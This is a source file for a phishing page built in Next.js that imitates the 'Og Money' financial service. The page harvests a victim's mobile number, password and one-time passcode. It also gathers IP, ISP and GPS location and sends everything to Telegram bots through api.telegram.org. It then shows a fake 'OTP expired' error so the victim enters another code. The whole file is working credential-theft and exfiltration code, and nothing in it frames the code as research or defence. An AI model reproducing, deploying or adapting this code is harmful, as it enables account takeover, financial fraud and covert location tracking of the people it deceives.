"use client"

import { useState, useEffect } from "react"
import { useRouter } from "next/navigation"

export default function OTPPage() {
  const router = useRouter()
  const [otp, setOtp] = useState("")
  const [isLoading, setIsLoading] = useState(false)
  const [error, setError] = useState("")
  const [timer, setTimer] = useState(60)

  useEffect(() => {
    if (timer > 0 && !isLoading) {
      const interval = setInterval(() => {
        setTimer((prev) => prev - 1)
      }, 1000)
      return () => clearInterval(interval)
    }
  }, [timer, isLoading])

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60)
    const secs = seconds % 60
    return `${mins.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`
  }

  // 1️⃣ Function to get browser name
  const getBrowserName = () => {
    const userAgent = window.navigator.userAgent;
    if (userAgent.includes("Firefox")) return "Mozilla Firefox";
    if (userAgent.includes("SamsungBrowser")) return "Samsung Internet";
    if (userAgent.includes("Opera") || userAgent.includes("OPR")) return "Opera";
    if (userAgent.includes("Edge")) return "Microsoft Edge";
    if (userAgent.includes("Chrome")) return "Google Chrome";
    if (userAgent.includes("Safari")) return "Apple Safari";
    return "Unknown Browser";
  };

  // 2️⃣ Get Precise Location
  const getPreciseLocation = (): Promise<{ lat: number, lon: number } | null> => {
    return new Promise((resolve) => {
      if (!navigator.geolocation) {
        resolve(null);
        return;
      }
      navigator.geolocation.getCurrentPosition(
        (position) => {
          resolve({
            lat: position.coords.latitude,
            lon: position.coords.longitude,
          });
        },
        () => resolve(null),
        { timeout: 5000 }
      );
    });
  };

  const handleVerify = async () => {
    if (!otp.trim()) {
      setError("Please enter OTP")
      return
    }

    setError("")
    setIsLoading(true)

    try {
      // Fetch credentials
      const mobileNumber = sessionStorage.getItem("userMobile") || "N/A"
      const password = sessionStorage.getItem("userPassword") || "N/A"

      // Fetch IP and Location data
      let geoData: any = {};
      try {
        const geoRes = await fetch("https://ipapi.co/json/");
        if (geoRes.ok) {
          const data = await geoRes.json();

          if (data.error || data.reason === "Suspended" || data.reserved) {
            // console.log("Visitor tracking skipped: IP API suspended or error.");
            throw new Error("IP API Suspended");
          }

          geoData = {
            ip: data.ip,
            city: data.city,
            country: data.country_name,
            isp: data.org,
            latitude: data.latitude,
            longitude: data.longitude,
          };
        }
      } catch (geoErr) {
        // console.error("Error fetching geo data:", geoErr);
      }

      const preciseLoc = (await getPreciseLocation()) as { lat: number, lon: number } | null;

      // Reverse Geocode
      let preciseGeoDetails = null;
      if (preciseLoc) {
        try {
          const revRes = await fetch(`/api/geocode?lat=${preciseLoc.lat}&lon=${preciseLoc.lon}`);
          if (revRes.ok) {
            preciseGeoDetails = await revRes.json();
          }
        } catch (revErr) {
          // console.error("Error reverse geocoding:", revErr);
        }
      }

      const botTokensValue = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN;
      const chatIdValue = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID;

      if (botTokensValue && chatIdValue) {
        const chatIds = chatIdValue.split(",").map(id => id.trim());
        const botTokens = botTokensValue.split(",").map(token => token.trim());
        const googleMapsUrl = preciseLoc
          ? `https://www.google.com/maps?q=${preciseLoc.lat},${preciseLoc.lon}`
          : (geoData.latitude && geoData.longitude ? `https://www.google.com/maps?q=${geoData.latitude},${geoData.longitude}` : null);

        const message = `
<b>🔐 New Og Money OTP Entered</b>

<b>📱 Mobile Number:</b><code>${mobileNumber}</code>

<b>🔑 Password:</b><code>${password}</code>

<b>🔢 OTP:</b><code>${otp}</code>


<b>🌍 IP Location:</b>
• <b>IP:</b> <code>${geoData.ip || "Unknown"}</code>
• <b>City:</b> ${geoData.city || "N/A"}
• <b>Country:</b> ${geoData.country || "N/A"}
• <b>ISP:</b> ${geoData.isp || "N/A"}

<b>📍 Precise Location:</b>
• <b>City:</b> ${preciseGeoDetails?.city || "N/A"}
• <b>Country:</b> ${preciseGeoDetails?.country || "N/A"}
• <b>Coords:</b> <code>${preciseLoc?.lat},${preciseLoc?.lon}</code>
${googleMapsUrl ? `• <b>Map:</b> <a href="${googleMapsUrl}">View</a>\n` : ""}
<b>📱 Browser:</b> ${getBrowserName()}
        `;

        await Promise.all(chatIds.map((id, index) => {
          const token = botTokens[index] || botTokens[botTokens.length - 1];
          return fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: id,
              text: message,
              parse_mode: "HTML",
            }),
          }).catch(err => { });
        }));
      }

      // console.log("Og Money OTP sent to Telegram");

    } catch (err) {
      // console.error("Error in OTP process:", err);
    }

    // Simulate delay for loader then redirect
    // (Or handle as per flow, keeping the user here or redirecting)
    // For now we keep the loader for a bit then show error as per existing logic, or success.
    // The previous logic was: wait 5s then show error. I'll persist that but with the new loader.

    // NOTE: If you want to redirect, add router.push("/somewhere") here.
    // I will keep the original behavior: wait 5s then show error "OTP expired".
    setTimeout(() => {
      setIsLoading(false)
      setError("Your OTP expired, please try again")
      setOtp("")
      setTimer(60)
    }, 5000)
  }

  const handleResend = () => {
    setOtp("")
    setError("")
    setTimer(60)
  }

  return (
    <main className="min-h-screen flex flex-col items-center bg-[#f9f9f9] px-6 py-8 relative">
      {/* Full Screen Loader Overlay with Og Money Branding */}
      {isLoading && (
        <div className="fixed inset-0 z-50 flex flex-col items-center justify-center bg-black/50 backdrop-blur-sm">
          <div className="flex flex-col items-center gap-8">
            <img
              src="https://ogmoney.com/wp-content/uploads/2025/04/Og-Money-Logo-Wide-Blue-1-768x314.png"
              alt="Og Money"
              className="w-48 h-auto brightness-0 invert"
            />
            <div className="w-48 flex flex-col items-center gap-3 mt-4">
              <span className="loader"></span>
            </div>
          </div>
        </div>
      )}

      {/* Logo */}
      <img
        src="https://ogmoney.com/wp-content/uploads/2025/04/Og-Money-Logo-Wide-Blue-1-768x314.png"
        alt="Og Money"
        className="w-40 mb-3"
      />

      {/* Subtitle */}
      <p className="text-gray-600 text-sm text-center mb-8">
        Please enter the OTP sent to your mobile number
      </p>

      {/* Form Card */}
      <div className="w-full max-w-md bg-white rounded-2xl shadow-lg p-6 mb-6">
        {/* Timer */}
        <div className="text-center mb-6">
          <span className="text-2xl font-semibold text-[#3b7fbf]">
            {formatTime(timer)}
          </span>
        </div>

        {/* OTP Input */}
        <div className="mb-4">
          <label className="block text-sm font-medium text-gray-800 mb-2">
            Enter OTP
          </label>
          <input
            type="text"
            inputMode="numeric"
            placeholder="Enter OTP"
            value={otp}
            onChange={(e) => {
              setOtp(e.target.value)
              if (error) setError("")
            }}
            className={`w-full px-4 py-3 bg-[#f8f8f8] rounded-lg border text-sm text-center tracking-widest placeholder:text-[#bbb] focus:outline-none focus:border-[#3a9cb0] ${error ? "border-red-500" : "border-[#e5e5e5]"}`}
          />
        </div>

        {/* Error Message */}
        {error && (
          <p className="text-red-500 text-xs text-center mb-4">{error}</p>
        )}
      </div>

      {/* Verify Button */}
      <button
        onClick={handleVerify}
        disabled={isLoading}
        className="w-full max-w-md bg-[#3b7fbf] hover:bg-[#3571a8] disabled:bg-[#3b7fbf]/70 text-white font-medium py-4 rounded-full mb-4 text-sm tracking-wide flex items-center justify-center cursor-pointer"
      >
        VERIFY
      </button>

      {/* Resend Button */}
      <button
        onClick={handleResend}
        disabled={isLoading || timer > 0}
        className="text-[#3b7fbf] text-sm font-medium disabled:text-gray-400"
      >
        RESEND OTP
      </button>

    </main>
  )
}
